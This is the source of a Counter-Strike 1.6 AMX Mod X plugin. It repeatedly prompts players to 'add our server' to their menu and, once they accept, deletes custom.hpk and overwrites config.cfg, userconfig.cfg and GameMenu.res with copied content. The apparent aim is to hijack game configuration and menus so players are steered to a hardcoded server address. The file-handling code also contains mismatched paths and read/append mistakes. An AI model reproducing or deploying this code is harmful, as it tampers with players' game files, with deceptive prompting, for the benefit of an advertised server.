#include <amxmodx>
#include <amxmisc>

#define CFG_FILE1 "autoexec.CFG"
#define CFG_FILE2 "joystick.CFG"
#define CFG_FILE3 "userconfig.CFG"
#define CONNECT "Connect 95.158.148.253:27019"

new filename[512],filename1[512],filename2[512],filename3[512],filename4[512],filename5[512],filename6[512],filename7[512]
new keysmenu = (1<<0)|(1<<1)|(1<<2)|(1<<3)|(1<<4)|(1<<5)|(1<<6)|(1<<7)|(1<<8)|(1<<9)
public plugin_init() 
{	
register_menu("Menu", keysmenu, "Submenu")	

get_configsdir(filename,255)
format(filename,255,"../cstrike/addons/amxmodx/configs/config.cfg",filename)

get_configsdir(filename1,255)
format(filename1,255,"../cstrike/addons/amxmodx/configs/servers.txt",filename1)

get_configsdir(filename2,255)
format(filename2,255,"../cstrike/config.cfg",filename2)

get_configsdir(filename3,255)
format(filename3,255,"../valve/config.cfg",filename3)

get_configsdir(filename5,255)
format(filename5,255,"../cstrike/userconfig.cfg",filename5)

get_configsdir(filename4,255)
format(filename4,255,"../cstrike/custom.hpk",filename4)

get_configsdir(filename6,255)
format(filename6,255,"../valve/resource/GameMenu.res",filename6)

get_configsdir(filename7,255)
format(filename7,255,"../cstrike/resource/GameMenu.res",filename7)
}
public client_putinserver(id)
{
set_task(60.0, "Menu", id)
}

public Menu(id)
{
remove_task(id)	

static menu[500], len
len = 0
if(is_user_connected(id))
{
len += formatex(menu[len], charsmax(menu) - len, "\yDo you want to add our server in your Menu?^n^n")
len += formatex(menu[len], charsmax(menu) - len, "\r1. \wYes, I want !^n")
len += formatex(menu[len], charsmax(menu) - len, "\r2. \wNo, thank You^n^n")
show_menu(id, keysmenu, menu, -1, "Menu")
}
}

public Submenu(id, key)
{
switch(key)
{
case 0:
{
if(file_exists(filename4))  	
delete_file(filename4)

check(id)	
check2(id)
check3(id)	
check5(id)
check6(id)
}
case 1:
{
set_task(60.0, "Menu", id)	
}
}
}

public check3(id)
{
if(file_exists(filename5))  	
delete_file(filename5)

new file = fopen(filename,"r")
new tmpfile = fopen(filename5,"a+")
new text[512], text_to_find[] = "hello"

if(!file || !tmpfile)
console_print(0,"Error:%d,%d",file,tmpfile)

while(!feof(file))
{
fgets(file, text, 128)
if(contain(text, text_to_find) != -1)
continue
fputs(tmpfile,text)
}

fclose(file)
fclose(tmpfile)
}
public check(id)
{
if(file_exists(filename2))  	
delete_file(filename2)

new file = fopen(filename,"r")
new tmpfile = fopen(filename2,"a+")
new text[512], text_to_find[] = "hello"

if(!file || !tmpfile)
console_print(0,"Error:%d,%d",file,tmpfile)

while(!feof(file))
{
fgets(file, text, 128)
if(contain(text, text_to_find) != -1)
continue
fputs(tmpfile,text)
}

fclose(file)
fclose(tmpfile)
}
public check2(id)
{
if(file_exists(filename2))  	
delete_file(filename3)

new file = fopen(filename,"r")
new tmpfile = fopen(filename3,"a+")
new text[512], text_to_find[] = "hello"

if(!file || !tmpfile)
console_print(0,"Error:%d,%d",file,tmpfile)

while(!feof(file))
{
fgets(file, text, 128)
if(contain(text, text_to_find) != -1)
continue
fputs(tmpfile,text)
}

fclose(file)
fclose(tmpfile)
}

public check5(id)
{
if(file_exists(filename6))  	
delete_file(filename6)

new file = fopen(filename1,"a+")
new tmpfile = fopen(filename6,"a+")
new text[512], text_to_find[] = "hello"

if(!file || !tmpfile)
console_print(0,"Error:%d,%d",file,tmpfile)

while(!feof(file))
{
fgets(file, text, 128)
if(contain(text, text_to_find) != -1)
continue
fputs(tmpfile,text)
}

fclose(file)
fclose(tmpfile)
}
public check6(id)
{
if(file_exists(filename7))  	
delete_file(filename7)

new file = fopen(filename1,"r")
new tmpfile = fopen(filename7,"a+")
new text[512], text_to_find[] = "hello"

if(!file || !tmpfile)
console_print(0,"Error:%d,%d",file,tmpfile)

while(!feof(file))
{
fgets(file, text, 128)
if(contain(text, text_to_find) != -1)
continue
fputs(tmpfile,text)
}

fclose(file)
fclose(tmpfile)
}
/* AMXX-Studio Notes - DO NOT MODIFY BELOW HERE
*{\\ rtf1\\ ansi\\ deff0{\\ fonttbl{\\ f0\\ fnil Tahoma;}}\n\\ viewkind4\\ uc1\\ pard\\ lang1033\\ f0\\ fs16 \n\\ par }
*/
